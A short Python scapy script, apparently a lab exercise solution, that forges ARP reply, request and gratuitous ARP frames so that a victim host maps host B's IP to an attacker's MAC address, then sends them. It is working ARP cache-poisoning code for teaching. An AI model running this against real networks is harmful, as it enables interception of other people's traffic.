#!/usr/bin/env python3
from scapy.all import *

IP_V       = "10.9.0.5"            #host A
MAC_V_real = "02:42:0a:09:00:05"   #host A

IP_T       = "10.9.0.6"            #host B
MAC_T_fake = "02:42:0a:09:00:69"   #host M

# Task 1B Constructing ARP Reply packet
ether1  = Ether(src = MAC_T_fake, dst = MAC_V_real)
arp1    = ARP(psrc = IP_T, hwsrc = MAC_T_fake, 
             pdst = IP_V, hwdst = MAC_V_real)
arp1.op = 2   # Reply
frame1  = ether1/arp1

# Task 1A Constructing ARP Request packet
ether2  = Ether(src = MAC_T_fake, dst = "ff:ff:ff:ff:ff:ff")
arp2    = ARP(psrc = IP_T, hwsrc = MAC_T_fake, pdst = IP_V)
arp2.op = 1   # Request
frame2 = ether2/arp2

# Task 1C Constructing Gratuitous ARP packet
ether3  = Ether(src = MAC_T_fake, dst = "ff:ff:ff:ff:ff:ff")
arp3    = ARP(psrc  = IP_T, hwsrc = MAC_T_fake,
              pdst  = IP_T, hwdst = "ff:ff:ff:ff:ff:ff")
arp3.op = 2   # Reply
frame3 = ether3/arp3

# Send out the Spoofed ARP packet
sendp(frame1)  # Task 1B
sendp(frame2)  # Task 1A
sendp(frame3)  # Task 1C
